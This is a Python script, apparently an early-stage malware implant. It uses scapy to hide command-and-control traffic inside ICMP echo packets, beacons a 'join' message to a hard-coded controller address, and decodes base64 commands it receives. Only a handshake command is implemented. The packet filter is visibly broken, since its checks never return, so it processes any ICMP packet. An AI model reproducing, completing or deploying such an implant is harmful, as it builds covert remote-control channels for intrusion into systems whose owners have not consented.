#!/usr/bin/python3

from scapy.all import sr,IP,ICMP,Raw,sniff
import base64
from shelly import Host
import shelly
import ast

ICMP_ID = int(12800)
TTL = int(64)

class Implant(Host):
    
    def __init__(self, controller_ip):
        super().__init__()
        self.type = "implant"
        self.controller_ip = controller_ip

    def sniff_callback(self, packet):        
        if packet[IP].src != self.controller_ip:
            pass
        elif packet[ICMP].type != 8:
            pass
        elif packet[ICMP].id != ICMP_ID:
            pass
        elif not packet[Raw].load:
            pass

        encoded_shellpack = (packet[Raw].load).decode('utf-8', errors='ignore')
        shellpack = base64.b64decode(encoded_shellpack).decode()
        unpacked = ast.literal_eval(shellpack)
        
        match unpacked['command']:
            case "join":
                self.join(unpacked)
            case _:
                print("Default case")

    def join(self, shellpack):
        
        match shellpack['message']:
            case "how are you":
                response_shellpack = shelly.build_shellpack(self, "join", "fine thank you")
                shelly.send(self.controller_ip, response_shellpack)

        return


def setup_implant() -> Implant:
    print("[ Setting up implant... ]")
    implant = Implant(controller_ip="192.168.157.6")
    print(implant)
    
    # Send join command
    shellpack = shelly.build_shellpack(implant, "join", "hello")
    shelly.send(implant.controller_ip, shellpack)
    return implant

if __name__ == "__main__":
    implant = setup_implant()
    print("[ ICMP Sniffing Started ]")

    sniff(iface=implant.iface, prn=implant.sniff_callback, filter="icmp", store="0")
